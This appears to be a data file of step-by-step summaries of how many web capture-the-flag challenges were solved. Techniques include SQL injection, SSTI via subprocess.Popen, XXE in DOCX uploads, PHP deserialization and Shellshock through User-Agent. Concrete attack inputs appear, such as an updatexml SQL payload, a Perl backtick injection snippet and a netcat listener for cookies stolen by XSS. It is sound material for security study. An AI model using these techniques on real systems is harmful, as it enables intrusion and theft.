    "Visited 'https://codeiiest.github.io/d4rks0c1ety.html'",
    "Checked the source code of the 'd4rks0c1ety' page",
    "Found the second part of the flag '_th1s_w3bs1t3}' in an HTML comment",
    "Joined the two parts of the flag to form 'accessdenied{1_w3nt_thr0ugh_th1s_w3bs1t3}'",
    "Access the website homepage",
    "Refresh the page",
    "Analyzed the browser console.",
    "Found an error 'jquery-3.3.1.min.js:2 Uncaught SyntaxError: Unexpected token {'",
    "Visited the reported portion of the JavaScript file.",
    "Found the flag 'accessdenied{1t_w4s_h1dd3n_h3r3_594a9sd}' in the JavaScript file.",
    "Access the website home page.",
    "Identify a value in Base64 within the cookie.",
    "Decode the Base64 cookie value.",
    "Gain understanding of the game mechanics.",
    "Recognize the objective and rules of the game.",
    "Note the time limit and required number of clicks.",
    "Acknowledge that squares should be avoided while clicking.",
    "Realize the random placement of squares in each round.",
    "Analyze the obfuscated front-end source code.",
    "Identify element and class names within the code.",
    "Associate recognized components with their intended functionalities.",
    "Examine the provided back-end source code.",
    "Recognize the first position in the JSON array as the winning position.",
    "Implement logic to determine the winning position.",
    "Execute the developed script.",
    "Monitor the output of the script.",
    "Visit the website mentioned in the challenge",
    "Access the URL `https://xmas.2020.chall.actf.co/post`",
    "Post the crafted message",
    "Observe the website returning a code",
    "Access the URL `https://xmas.2020.chall.actf.co/report`",
    "Send the code to the site administrator",
    "Wait for the admin cookies to be caught",
    "Access the URL `https://xmas.2020.chall.actf.co/admin`",
    "Send the request and receive a response",
    "Extract the flag from the provided string",
    "Visit the provided URL.",
    "View the website contents.",
    "Extract the configs.zip file.",
    "Identify the rule within the configuration file.",
    "Make a GET request to /secret.html.",
    "Observe that the contents of 'secret' tags are replaced with 'Protected'.",
    "Received the URL https://poems.asisctf.com/ as part of the challenge.",
    "Visited the URL which led to a website containing a list of books.",
    "Identified two actions 'an excerpt' and 'read online' on the website.",
    "Noticed that 'read online' opens a link from an unrelated domain.",
    "Explored the HTML source of the webpage.",
    "Discovered a treasury.js file in the HTML source.",
    "Determined that the treasury.js file can help understand the actions performed on the site.",
    "Figured out that the homepage is loaded as a result of an HTTP GET request to '/books.php?type=list'.",
    "Noticed an excerpt button on the webpage.",
    "Identified that the 'read online' button opens a new window upon clicking.",
    "Realized that the new window redirects to a unique link for each book.",
    "Analyzing the behavior of the website led to a suspicion that the web application might be vulnerable to SQL injection.",
    "Encountered a weird error, further hinting at the presence of an SQL injection vulnerability.",
    "Recognized from the error that the website is likely reading XML data from a database.",
    "Decided to use SQLmap, a tool for automating the detection and exploitation of SQL injection flaws.",
    "Implemented SQLmap to exploit the potential SQL injection vulnerability.",
    "Analyzed the results from the SQLmap.",
    "Concluded from the SQLmap results that there are two databases available: 'ASISCTF' and 'information_schema'.",
    "Continued to interpret the results from SQLmap.",
    "Discovered in the SQLmap results that the 'ASISCTF' database has one table termed 'books'.",
    "Evaluated the structure of the 'books' table.",
    "Noticed that the 'books' table has two columns: 'id' and 'info'.",
    "Continued to analyze the output from SQLmap.",
    "Considered the possibility of output truncation by SQLmap.",
    "Found out that despite such constraints, the SQLmap successfully retrieved the flag 'ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}'.",
    "Considered the XML-related error spawned previously.",
    "Crafted a malicious payload.",
    "Passed the payload via the SQL injection vulnerability.",
    "Conducted a remote file read operation.",
    "Constructed a payload to test the exploit.",
    "Successfully read the remote files.",
    "Used PHP filters.",
    "Created another payload.",
    "Resulted in a base64-encoded result.",
    "Decoded the base64 encoded result.",
    "Connect to the given URL.",
    "View the source code.",
    "Examine the source code.",
    "Search for 'eval' syntax.",
    "Identify 'eval' syntax on 'warmup' GET parameter.",
    "Note that 'warmup' GET parameter is strictly checked for.",
    "Determine attacking strategy.",
    "Implement research knowledge.",
    "Break down the payload.",
    "First part constructs a string representation.",
    "Flag is output after successful execution of the attack.",
    "Discover a JavaScript script in the HTML.",
    "Access the obfuscated code at http://challenges.auctf.com:30022/authentication.js.",
    "Decode the initial array with base64 encoded strings in the JavaScript script.",
    "Discover another endpoint: http://challenges.auctf.com:30022/hidden/nextstep.php.",
    "Contact the discovered endpoint based on the decoded strings.",
    "Perform a GET request to the discovered endpoint.",
    "Decode the ROT13 encrypted message in the HTTP response.",
    "Perform a POST request to the path provided by the decoded message.",
    "Perform another POST request.",
    "Retrieve the flag from the response of the previous POST request.",
    "Connect to URL",
    "Find default Apache2 installation page",
    "Perform URL enumeration",
    "Use 'dirb' tool",
    "Connect to 'scriptlet' endpoint",
    "Reveal running as 'www-data'",
    "Find 'flag.file'",
    "Identify 'flag.file' contents",
    "Recognize it as a GZip archive",
    "Recreate GZip archive",
    "Extract 'flag.txt' from the GZip archive",
    "Reveal the flag",
    "Visited the challenge webpage",
    "Checked the webpage source",
    "Accessed 'http://challenges.auctf.com:30020/robots.txt' on the browser",
    "Researched the trivia answer 'Fear the Old Blood'",
    "Retrieved the flag in the response",
    "Accessed the website.",
    "Found out it is an online calculator.",
    "Made a POST request to the server.",
    "Triggered an error.",
    "Discovered that the website is using PHP eval() function.",
    "Used PHP system() function.",
    "Executed commands.",
    "Executed 'id' command.",
    "Executed 'ls -al' command.",
    "Listed the directory contents.",
    "Printed the content of the index.php file.",
    "Discovered the flag within the content of the index.php file.",
    "Access the website",
    "Make a POST request",
    "Submit a malformed statement",
    "Determine that the website is using PHP eval() function",
    "Use PHP system() function",
    "Execute commands",
    "Execute 'id' command",
    "Retrieve user information",
    "Execute 'ls -al' command",
    "Retrieve directory listing",
    "Search for the flag within the content of the index.php file",
    "Analyzed the webpage.",
    "Noticed 'frequency' increments with each page refresh.",
    "Identified that 'transmissions' had a fixed part at the beginning and end.",
    "Identified that 'transmissions' had a variable part in the middle.",
    "Understood that the variable part contained the previous char of the flag.",
    "Understood that the variable part contained the actual char of the flag.",
    "Understood that the variable part contained the index of the actual char.",
    "Script composes the flag.",
    "Implemented a condition in the Python script.",
    "Unquoted and cleaned up the cookie values within the Python script.",
    "Appended unique transmission values to a list.",
    "Created another loop in the Python script.",
    "Iteratively added a character to the flag.",
    "Checking if the character's index matches the desired one.",
    "The script printed out the flag after successful execution.",
    "Attempted to connect to the homepage.",
    "Received an error of HTTP method not allowed.",
    "Server returned all allowed methods.",
    "Experimented with each method.",
    "Found that 'POST' and 'PUT' returned a different result.",
    "Tried all HTTP verbs for each endpoint.",
    "Received a PDF file from the '/circle/one/' endpoint.",
    "Received different responses from the '/two/' endpoint with 'PUT' HTTP verb.",
    "Received different responses from the '/two/' endpoint with 'CONNECT' HTTP verb.",
    "Received a PNG image from the 'CONNECT /two/' request.",
    "Received a PNG image with a crossword puzzle from the '/square/' endpoint.",
    "Determined the solution for the crossword puzzle.",
    "Received a webpage from the '/com/seaerch/' endpoint.",
    "Guessed the requirement of an 'application/x-www-form-urlencoded' parameter.",
    "Received a message from the '/vim/quit/' endpoint.",
    "Suggested using a query parameter.",
    "Revealed the requirement of a 'vim' command.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Guessed the first part of the flag referred to in the PDF.",
    "Combined both parts of the flag to solve the challenge.",
    "Attempted to connect to the homepage.",
    "Server returned all allowed methods.",
    "Experimented with each method.",
    "Guessed that endpoints were present.",
    "Tried all HTTP verbs for each endpoint.",
    "Received a PDF file from '/circle/one/' endpoint.",
    "Received different responses from '/two/' endpoint with 'PUT' and 'CONNECT' HTTP verbs.",
    "Received a PNG image from 'CONNECT /two/' request.",
    "Received a PNG image with a crossword puzzle from '/square/' endpoint.",
    "Determined the solution for the crossword puzzle.",
    "Received a webpage from '/com/seaerch/' endpoint.",
    "Guessed that 'application/x-www-form-urlencoded' parameter must be used.",
    "Used the 'flag' value on '/com/seaerch/' endpoint.",
    "Received a message from '/vim/quit/' endpoint.",
    "Passed a random value on the endpoint.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Put together all obtained parts of the flag.",
    "Guessed the first part of the flag referred to in the PDF.",
    "Combined both parts of the flag.",
    "Connect to the website",
    "Observe that directory listing is active",
    "Identify 'login.php' and 'login.php.bak' files",
    "Observe the contents of the first page",
    "Note that the message 'Not authenticated' is displayed",
    "Discover the requirement of the 'otadmin' cookie",
    "Note the regex format /^{\"hash\": [0-9A-Z\"]+}$/",
    "Craft a value for the cookie",
    "Ensure the value is {\"hash\": \"T35T\"}",
    "Use the crafted cookie value",
    "Analyze the hint",
    "Realize the issue in the comparison",
    "Identify the type juggling scenario",
    "Note the comparison $session_data['hash'] != strtoupper(MD5($cfg_pass))",
    "Decide to exploit the type juggling scenario",
    "Create a Python script",
    "Design the script to automate the trial and error process",
    "Exploit the type juggling loophole",
    "Use the discovered cookie",
    "Reveal the flag: p4{wtf_php_comparisons_how_do_they_work}",
    "Accessed the meme generator web application",
    "Experimented with the meme generator functionality",
    "Observed that the web application uses PhantomJS/2.1.1",
    "Researched about PhantomJS/2.1.1",
    "Identified a known vulnerability (CVE-2019-17221)",
    "Used the knowledge of the vulnerability to conclude that the web application potentially parses the HTML content and interpret it",
    "Created an XML HTTP request that references the /etc/flag.txt directory",
    "Injected the crafted payload into a request in either the top text",
    "Injected the crafted payload into a request in either the bottom text",
    "Submitted this payload to the meme generator",
    "Realised that the generated PDF had the flag inside",
    "Retrieved the CTF flag",
    "Accessed the meme generator web application.",
    "Engaged with different features of the meme generator.",
    "Identified that the underpinning technology of the web application is PhantomJS/2.1.1.",
    "Conducted a study about PhantomJS/2.1.1.",
    "Applied the knowledge of the discovered vulnerability to infer certain characteristics of the web application.",
    "Concluded that the web application may interpret HTML content, thus implying a potential for Cross-site Scripting (XSS).",
    "Formulated an XML HTTP request.",
    "Introduced the crafted payload into either the top text or bottom text of a request.",
    "Submitted the request containing the crafted payload to the meme generator.",
    "Analyzed the generated PDF.",
    "Discovered that the PDF contains the flag.",
    "Retrieved the CTF flag.",
    "Recognize 'SSTI' in the given URL",
    "Interpret 'SSTI' as a hint to 'Server-Side Template Injection' vulnerabilities",
    "Verify if the injected template operation (7*7) triggers the SSTI vulnerability",
    "Test the character '%'",
    "Test the character '['",
    "Test the character ']'",
    "Test the character '\"'",
    "Test the character '+'",
    "Test the character '_'",
    "Check if any of the tested characters bypass the template engine",
    "Create a payload",
    "Execute the payload to return all the subclasses",
    "Collect the list of subclasses returned as a result",
    "Find the required (subprocess.Popen) class among the identified subclasses",
    "Determine the position of the (subprocess.Popen) class, which is 407",
    "Use the identified class (subprocess.Popen) to execute the 'id' command",
    "Use the identified class (subprocess.Popen) to list directory content",
    "List directory content remotely using the identified class",
    "Use the identified class (subprocess.Popen) to read the content of 'flag.txt'",
    "Visit the website http://easy-php.darkarmy.xyz/",
    "Visit http://easy-php.darkarmy.xyz/robots.txt",
    "Open http://easy-php.darkarmy.xyz/?lmao",
    "Observe the PHP code of the website",
    "Notice that the site's PHP code allows for the crafting of 'preg_replace'",
    "Trigger phpinfo() output by visiting 'http://easy-php.darkarmy.xyz/?bruh=phpinfo()&nic3=/DarkCON/e'",
    "Discover that the 'is_payload_danger' method prevents certain functions such as 'system'",
    "Decode the base64 response",
    "Use the 'glob' function to find interesting files",
    "Discover a file named 'flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Decode the base64 response",
    "Reveal the challenge flag",
    "Perform basic web enumeration.",
    "Use the tool 'git-dumper'.",
    "Inspect the 'git log'.",
    "View all previous commits in the repository.",
    "Recognize the possibility of useful information in previous commits.",
    "Recognize the presence of a file named 'flag.jpg'.",
    "Realize that the file 'flag.jpg' was later removed.",
    "Restore the repository to the previous commit.",
    "Find the flag file 'flag.jpg'.",
    "Read the flag value as 'darkCON{g1t_d4_fl4g}'.",
    "Visit the website",
    "Read HTML",
    "Note that the PHP code renames the uploaded file with a random name while preserving the file extension",
    "Upload a PHP shell",
    "Note that the PHP shell can be executed by visiting the uploaded file",
    "Run the PHP shell",
    "Note that the execution of the PHP shell was unsuccessful",
    "Add phpinfo() to the code in the PHP shell",
    "Get information about the PHP configuration",
    "Notice that the PHP configuration has several functions disabled",
    "Note that 'scandir' and 'file_get_contents' are not disabled",
    "Use 'scandir' and 'file_get_contents' to browse through files in the '/etc' directory",
    "Run the PHP exploit",
    "Note that the flag obtained was 'darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}'",
    "Connected to the provided web site.",
    "Was presented with an authentication form displaying the user's IP.",
    "Examined the HTML source code of the page.",
    "Revealed default credentials.",
    "Used the default credentials.",
    "Logged in.",
    "Observed User-Agent details.",
    "Observed an image printed as a response to the login.",
    "Received a SQL error.",
    "SQL injection via User-Agent string was possible.",
    "Decided to leak the database name.",
    "Had to devise a new strategy as this query was of type 'INSERT'.",
    "Used the following payload: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #.",
    "Received an XPATH syntax error.",
    "Contained the database name.",
    "Used the database name to compose the flag.",
    "Access the website 'http://filereader.darkarmy.xyz/'",
    "Identify the upload form on the website",
    "Understand from the description that an XML External Entity (XXE) vulnerability might be involved",
    "Identify that the form only allows the uploading of PDF and DOCX files",
    "Upload a DOCX file",
    "Understand that DOCX files are actually a collection of XML files",
    "Create a new DOCX file",
    "Alter the file 'app.xml' inside the new DOCX file",
    "Modify the number of pages stored in 'app.xml'",
    "Inject entity 'xxe' into 'app.xml'",
    "Upload the modified DOCX file",
    "Website parses the XML",
    "Website evaluates the 'xxe' entity",
    "Accessed the provided URL.",
    "Checked the PHP source code.",
    "Saw the criteria for getting the flag printed.",
    "Identified the specific query string parameters needed according to the code.",
    "Identified the required user-agent according to the code.",
    "Identified the need for a 'GET' request with two parameters having the same md5 hash.",
    "Understood from the code snippet that the md5 hash must collide.",
    "Generated two different strings with the same md5 hash.",
    "Used 'hex2bin' PHP function.",
    "Converted the hexadecimal values into binary data.",
    "Checked the equality of generated data from both the hexadecimal values.",
    "Generated the md5 hash for both binary data.",
    "Checked if both md5 hashes matched.",
    "Got two different URL encoded strings.",
    "Constructed the 'GET' request using 'darkctf', 'ctf2020', 'karma', and '2020' query parameters.",
    "Set the 'User-Agent' as per the requirement in the PHP code.",
    "Sent the 'GET' request to the provided web page.",
    "Received the response from the web page.",
    "Visit the challenge URL",
    "Analyze the HTML code of the page",
    "Analyze the provided PCAP file",
    "Identify a packet (#6) in the PCAP file",
    "Access the new URL 'https://freewifi.ctf.umbccd.io/staff.html'",
    "Identify JWT 'identity' cookie as '31337'",
    "Identify JWT 'secret' cookie as 'dawgCTF?heckin#bamboozle'",
    "Identify packet #261 in the capture",
    "Identify packet #263 in the capture",
    "Intercept a GET request to /jwtlogin",
    "Use jwt.io tool",
    "Send a GET request to /jwtlogin",
    "Observe the flag in the response from the server",
    "Access the website at 'http://freewifi.ctf.umbccd.io/'.",
    "Observe a login page with two authentication options: username and password, or WifiKey.",
    "Analyze the HTML for possible vulnerabilities.",
    "Analyze the provided PCAP file.",
    "Understand the functionality and workings of the 'forgot password' feature.",
    "Discover a JavaScript code that copies the email value to the username field.",
    "Intercept the Post Request in the JavaScript code.",
    "Observe the response received after sending the manipulated request.",
    "Confirm the success message in the response.",
    "Identify the flag hidden in the retrieved response: 'DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}'.",
    "Connect to the website.",
    "Download the PCAP file.",
    "Analyze the PCAP file.",
    "Filter for POST requests passing 'passcode' values.",
    "Capture wifi nonces.",
    "Apply the algorithm to the captured wifi nonces.",
    "Discover that 'passcode' values are the first 8 characters of the hashed 'nonce' value.",
    "Apply the same process to the challenge's 'nonce' value.",
    "Perform a POST request.",
    "Visit the provided URL",
    "Inspect the source code of the website",
    "Locate an image tag",
    "Check the URL parameter of the image tag",
    "Retrieve the flag from the URL parameter",
    "Visit the given URL",
    "Inspect the source code of the webpage",
    "Find an image tag",
    "Find the onclick attribute",
    "Analyze the encoded string",
    "Open the JavaScript console in the web browser",
    "Obtain the flag from the decoded text",
    "Find a target website.",
    "Observe a login form with JavaScript check.",
    "Identify that the JavaScript check prevents submission of long passwords.",
    "Discover that the script can be bypassed by disabling JavaScript.",
    "Discover that the script can be bypassed by using a proxy tool for request interception and repetition.",
    "Enter a common password, e.g., 'password'.",
    "Retrieve the flag successfully.",
    "Access the website.",
    "Observe allowed actions: upload and comment on dog pictures.",
    "Find the endpoint '/dogooo/runcmd' enabling remote shell functionality.",
    "Identify functionalities accessed by authenticated users.",
    "Find the endpoint '/dogooo/user/create' for creating new users.",
    "Identify the publicly accessible functionality '/dogooo/deets/<postid>'.",
    "Observe the submission of comments as a two-step process.",
    "Locate the 'get_comments' function within the [loaddata.py](loaddata.py) file.",
    "Identify the code snippet that prints 'self.__dict__' in specific conditions.",
    "Conditions: Comment text contains a format string like '{rating}'.",
    "Verify that the post content is printed with 'self.__dict__' in the preview of the webpage.",
    "Utilize the '{rating[comments][0].__class__.__init__.__globals__}' format string.",
    "Access 'globals' objects using the format string.",
    "Find the database credentials in the output.",
    "Credentials: 'dogooo' for 'db_user' and 'dogZgoneWild' for 'db_pass'.",
    "Authenticate into the system.",
    "Create new users upon successful authentication.",
    "Verify authentication to the system.",
    "Locate the 'login' method in [dogooo_comments.py](dogooo_comments.py) file.",
    "Identify the usage of Python 3's f-Strings functionality in the 'login' method.",
    "Note that f-Strings can be used to call methods.",
    "Note the usage of the 'f()' method on the 'username' field.",
    "Recognize that this can be exploited for login.",
    "Create a new user.",
    "Observe the redirection upon successful authentication.",
    "Note that the redirected URL contains the flag.",
    "Identify the flag in the URL.",
    "Accessed the web application.",
    "Submitted a text content to a remote S3 bucket.",
    "Defined a GUID for the key.",
    "Retrieved the text content.",
    "Used the GUID to retrieve the content.",
    "Analyzed the provided files.",
    "Confirmed no intentional vulnerabilities within the files.",
    "Investigated the responses received.",
    "Paid particular attention to the HTTP headers: 'Server', 'Via', 'X-Served-By'.",
    "Viewed the backend infrastructure.",
    "Received a successful response from the webserver.",
    "Executed a GET request.",
    "Retrieved a POST request.",
    "Received the final flag in the response.",
    "Recognize the challenge requires locating a flag in /var/www/html/flag.php on a web server",
    "Identify the PHP source code provided that includes a User Submitted file inclusion vulnerability",
    "Craft a POST request to target this vulnerability",
    "Send the crafted POST request to the server",
    "Receive an HTTP response containing the Flag",
    "Analyzed the source code of the app provided in the challenge.",
    "Observed the user registration process.",
    "Understood that data is packed in 'username:password:admin' format.",
    "Discovered that the value 'false' is forced into the admin field during the normal registration process.",
    "Found that there were no escaping countermeasures for the ':' character.",
    "Successfully created an admin account.",
    "Used the created admin account to register with the username 'm3ssap0' and password 'pwnd:true'.",
    "Logged in using the newly created admin account.",
    "Retrieved the flag after successful login.",
    "Analyzed given PHP script to understand the functionality of different methods.",
    "Identified the target 'config.php' file.",
    "Inferred that the 'config.php' file must be printed via curl execution.",
    "Understood that to trigger curl execution, 'doit' method must be invoked.",
    "Noted that the 'doit' method is called in the '__destruct()' function.",
    "Understood the conditions for the 'doit' method being called, specifically if present in the '$method' attribute of the destructed object.",
    "Decided to exploit 'unserialize' method.",
    "Planned to craft an object with desired parameters.",
    "Created a PHP script to serialize an object for the exploit.",
    "Adjusted the '$method' attribute in the serialized object.",
    "Set the '$method' attribute in the serialized object to be 'doit'.",
    "Recognized a known strange PHP behavior could be exploited to circumvent file extension checks.",
    "Adjusted payload produced from serialization operation.",
    "Accounted for the replace operation which changed the string length.",
    "Made a GET request with the payload.",
    "Received flag 'F#{wtf_5trp0s_}' in response.",
    "Connect to website",
    "Analyze HTML",
    "Connect to source code link",
    "Reveal the structure of the site",
    "Find that the service functions similarly to Pastebin",
    "Understand that exploitation involves creation of a Stored XSS",
    "Find that content of the note is reflected in the source code",
    "Find that content of the note is inserted into the HTML",
    "Note that the const 'note' can be altered",
    "Close the string and insert arbitrary JavaScript",
    "Start a listening host with 'nc -lkv 1337'",
    "Craft a request",
    "Receive the flag from the listening host",
    "Visit the home page of the challenge URL",
    "Read the blog post on the home page",
    "Read the content of the 'robots.txt' file",
    "Access the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin'",
    "Inspect the HTML source code of the admin page",
    "Attempt to change the input field from 'password' to 'totp'",
    "Observe that the change does not work",
    "Observe the authentication response for a nonexistent user",
    "Observe the authentication response for an existing user with the wrong password",
    "Monitor the websockets traffic",
    "Observe the packets used for post retrieval",
    "Analyze the websockets packet structure",
    "Inspect the client-side code",
    "Identify that 6 parameters are read from the server response",
    "Recognize the parameters as 'author', 'hidden', 'id', 'postDate', 'text', 'title'",
    "Try SQL Injection on the data passed using fragment values",
    "Discover the flag 'rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}'",
    "Started the CTF Challenge in Houseplant CTF 2020 \u2013 Fire/place.",
    "Received instructions about the presence of certain elements inside the HTML page.",
    "Received fire-place[0].html e4a4c2321d18246d027184605ca52866 as the challenge.",
    "Downloaded the provided HTML file.",
    "Observed that the HTML file establishes a connection to a Firestore environment.",
    "Explored the Firestore environment and found a canvas for users.",
    "Observed that colored pixels on the canvas get stored into Firestore repository.",
    "Started interacting with the Firebase installation using the browser console.",
    "Analyzed the client source code.",
    "Read the official Firebase Firestore documentation.",
    "Used the provided code snippet.",
    "Retrieved data from each document in the Firestore database using the code snippet.",
    "Verified the contents of the retrieved data.",
    "Found that the data are structures that contain all the RGB values for pixels.",
    "Tried accessing a document called 'flag' in the Firestore database.",
    "Verified the contents of the 'flag' document.",
    "Found that the document contained the lyrics of a song and the required flag.",
    "Located the flag within the 'flag' document data.",
    "Identified the flag to be 'rtcp{d0n't_g1ve_us3rs_db_a((3ss}'.",
    "Recognized that the challenge name and challenge statement hinted at SQL injection.",
    "Inspected the HTML source code.",
    "Typed the URL 'http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce' in the web browser and visited the webpage.",
    "Inspected the source code of the newly accessed webpage.",
    "Recognized that the source code is written in PHP.",
    "Analyzed the PHP code in the source.",
    "Identified that the PHP code output the flag when a specific username 'flagman69' is used.",
    "Evaluated the PHP code to understand how user input is processed.",
    "Identified that the user input is directly concatenated to the SQL query ",
    "Concluded the webpage is vulnerable to SQL injection attacks.",
    "Observed the source code closely for additional checks or controls.",
    "Attempted to bypass password check using SQL injection.",
    "Logged into the authentication form successfully, but noticed the flag didn't print.",
    "Conjectured that the 'flagman69' user may not exist in the database given the failed flag output.",
    "Received SQL query result and examined the output.",
    "Discovered that the 'users' table had 3 columns.",
    "Identified that the second column contains usernames.",
    "Got authenticated as 'flagman69'.",
    "Analyze the HTML source code.",
    "Identify that the QR Code produced only contains the first character inserted.",
    "Use backticks to confirm remote code execution (RCE).",
    "Send the command `echo 'X'`.",
    "Receive a QR code of the letter 'X'.",
    "Write a Python script.",
    "Exfiltrate the output of executed commands.",
    "Create a function `execute_command` in the Python script.",
    "Run commands and increase the command output slice index until the result was empty.",
    "Create a function `http_get` in the Python script.",
    "Get the response.",
    "Check if PNG was found in the response.",
    "Launch remote commands using the Python script.",
    "Check the output of the command \"whoami\".",
    "List the files.",
    "Access the given URL.",
    "Review the source code of the homepage.",
    "Click on the link to enter the chat.",
    "Choose 'discord' as the OAuth2 Identity Provider upon redirection.",
    "Replace the existing 'with' value, 'discord', with a different value, 'foo'.",
    "Receive an HTTP 200 OK status code.",
    "Replace the 'with' value with the word 'flag'.",
    "Follow the redirection link after replacing the 'with' value with 'flag'.",
    "View the page with the flag, 'rtcp{rtcp-*is-s/ort-of-se1fh0st3d}'.",
    "Access the challenge PHP URL",
    "Identify the need to bypass server checks",
    "Craft serialized input",
    "Pass through certain PHP code",
    "Ensure the user's name and password are equal to the secret",
    "Build URL",
    "Receive partial flag",
    "Identify additional server check constraints",
    "Research ways to bypass PHP constraints",
    "Execute contents of another HTTP GET parameter",
    "Perfect payload",
    "Add GET parameter to final URL",
    "Call a specific function",
    "Successful bypass of all server checks",
    "Inspect the source code of the website.",
    "Identify what server-side checks are being done.",
    "Study the source code.",
    "Identify the checks for specific patterns.",
    "Determine which patterns will allow or block requests.",
    "Identify the first check.",
    "Observe that the first check points to a GET parameter with underscores.",
    "Recognize that query string cannot have underscores.",
    "Research if PHP manipulates input parameters' names.",
    "Look into how PHP removes whitespaces from input parameters' names.",
    "Investigate how PHP converts characters into underscores in input parameters' names.",
    "Write a PHP program.",
    "Check if characters are converted to underscores in the program.",
    "Enumerate the characters that are converted to underscores.",
    "Use the output of the script.",
    "Check the website response.",
    "Analyze the remaining check in the source code.",
    "Formulate the final URL.",
    "Use the final URL.",
    "Send a request to the server using the final URL.",
    "Successfully bypass the checks in the source code.",
    "Capture the flag.",
    "Initialize CTF task.",
    "Notice the name 'We will we will Shock You' as a hint towards Shellshock vulnerability.",
    "Cite the page http://104.197.168.32:17012/index.html as the challenge target.",
    "Analyze the HTML source of the page.",
    "Find a commented item in the HTML source of the page.",
    "Request http://104.197.168.32:17012/bashferno.cgi.",
    "Try to exploit Shellshock.",
    "Inject commands via 'User-Agent' HTTP header using curl command.",
    "Confirm remote command execution vulnerability.",
    "Execute '/bin/ls .'",
    "List the contents of the current directory on the Challenge server.",
    "Identify a file 'flag_for_this_INFERNO.txt' in the listed contents.",
    "Consider the file indicative of the flag for the challenge.",
    "Access the URL http://104.197.168.32:17012/flag_for_this_INFERNO.txt.",
    "Retrieve the flag.",
    "Confirm text 'infernoCTF{F33l_Th3_Sh0ck}' in the accessed file.",
    "Identify the text as the final flag of the challenge.",
    "Access the challenge website.",
    "Identify a vulnerability in the form.",
    "Realize the vulnerability allows command execution via shell.",
    "Use the directory listing to identify a 'print-flag' file.",
    "Connect to the challenge website",
    "Observe message indicating the ability to upload, list, and view LaTeX documents",
    "Identify potential for XSS due to unescaped output upon viewing uploaded documents",
    "Upload a LaTeX document",
    "Upload another LaTeX document",
    "Note the output shown upon submitting an article",
    "Discover an HTML comment about an unlinked source file",
    "Download the unlinked source file",
    "Analyze the downloaded source code",
    "Discover a conditional statement in the source code",
    "Access the list functionality",
    "Obtain the real flag within the FLAG cookie",
    "Connect to the website at http://10.255.0.1:8010/",
    "Register a user",
    "Reveal a PHP serialized class",
    "Craft a malicious serialized class",
    "Escalate privileges",
    "Encode the malicious serialized class in base64",
    "Replace the existing `login` cookie",
    "Visit the private section of the website",
    "Get the flag",
    "Access the website.",
    "Observe functionality to create custom cowfiles via the URL: `http://3.93.128.89:1204/cow_designer`.",
    "Devise a strategy to manipulate the content of the cowfile.",
    "Create a code snippet: `EOCA$eyes=`ls`;print '$eyes';`.",
    "Note that the 'A' placeholder in the code has to be replaced with `\\n (`0x0a`) in a proxy.",
    "Send an HTTP POST request via the /cow_designer page.",
    "Create another Perl code snippet.",
    "Receive the contents of the 'flag' file in the HTTP response.",
    "Open the URL with a browser",
    "Note the redirection to Google",
    "GET the page",
    "Note the returned HTML",
    "Note the allowed HTTP operations: 'GET', 'POST', 'HEAD', 'OPTIONS'",
    "Use the curl command",
    "POST the page",
    "Take note of the returned JavaScript code",
    "Rewrite the JavaScript code",
    "Format the code in a more readable format",
    "Modify the previous code",
    "Print the reversed string",
    "Run the written JavaScript",
    "Observe the output",
    "Note the output as the flag",
    "Sent a GET request to the provided URL: http://35.222.174.178/maria/.",
    "Observed an SQL query at the start of the HTML page returned.",
    "Interpreted the returned error message to infer the use of an SQLite database.",
    "Determined that the result of the SQL query was used to populate the PHPSESSID cookie by analyzing the HTTP responses.",
    "Determined the position of the column used to return data, it was found to be the last one.",
    "Discovered the presence of only two tables - nxf8_users and nxf8_sessions.",
    "Enumerated the columns of the user table.",
    "Analyzed the composition of the sessions table.",
    "Retrieved the 'id' of Maria from the user table.",
    "Queried the 'nxf8_sessions' table for session IDs where 'user_id' is 5.",
    "Located Maria's session ID.",
    "Impersonated Maria.",
    "Revealed the flag 'aj9dhAdf4'.",
    "Clone S3Scanner from GitHub repository",
    "Use 'git clone https://github.com/sa7mon/S3Scanner.git'",
    "Navigate to the S3Scanner directory",
    "Modify permissions of s3scanner.py",
    "Use 'chmod u+x s3scanner.py'",
    "Install the required dependencies for s3scanner",
    "Use 'pip install -r requirements.txt'",
    "Use 'python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com'",
    "Navigate into the bucket directory",
    "View the contents of the directory",
    "Use 'll'",
    "Use the 'cat' command to display the contents of youfoundme-asd897kjm.txt",
    "Connected to the website",
    "Experienced multiple redirections from one page to another",
    "Each page had one letter for the name",
    "Analyzed the requested pages",
    "Tuned the starting point of the redirection",
    "Discovered the full flag one character at a time",
    "The flag was 'RS{4!way5_Ke3p-m0v1ng}'",
    "Connect to http://ctfchallenges.ritsec.club:3000.",
    "Connect to http://ctfchallenges.ritsec.club:4000.",
    "Attempt to connect to http://ctfchallenges.ritsec.club:4000/api/normal.",
    "Make a GET request to http://ctfchallenges.ritsec.club:3000/auth specifying the name as m3ssap0.",
    "Decode the JWT.",
    "Understand its format.",
    "Find out that it has only user privileges.",
    "Use the obtained JWT to authenticate using the /api/normal endpoint.",
    "Receive a message stating flags are not for normal users.",
    "Attempt to use the /api/admin endpoint using the obtained JWT.",
    "Receive a message that the user is not an admin.",
    "Find in the robots.txt file that /signing.pem is disallowed.",
    "Make another GET request to obtain the signing certificate from the platform.",
    "Use the signing certificate to generate a new HMAC signature.",
    "Create a new JWT.",
    "Receive the flag: RITSEC{JWT_th1s_0ne_d0wn}.",
    "Connect to the website",
    "Discover HTML comment",
    "Recognize image upload functionality",
    "Observe images displayed in a gallery",
    "Understand vulnerability of upload functionality",
    "Realize possibility of shell insertion",
    "Duplicate an image file",
    "Rename duplicated file to indicate shell",
    "Identify the usage of exiftool",
    "Perform image file upload",
    "Find the renamed file path of the uploaded image",
    "Exploit the remote command execution vulnerability",
    "List directories in the root location",
    "Exploit the vulnerability to search for files",
    "Locate flag.txt file",
    "Discover flag.txt file in the /home directory",
    "Display the content of the flag.txt file",
    "Retrieve the flag from file content",
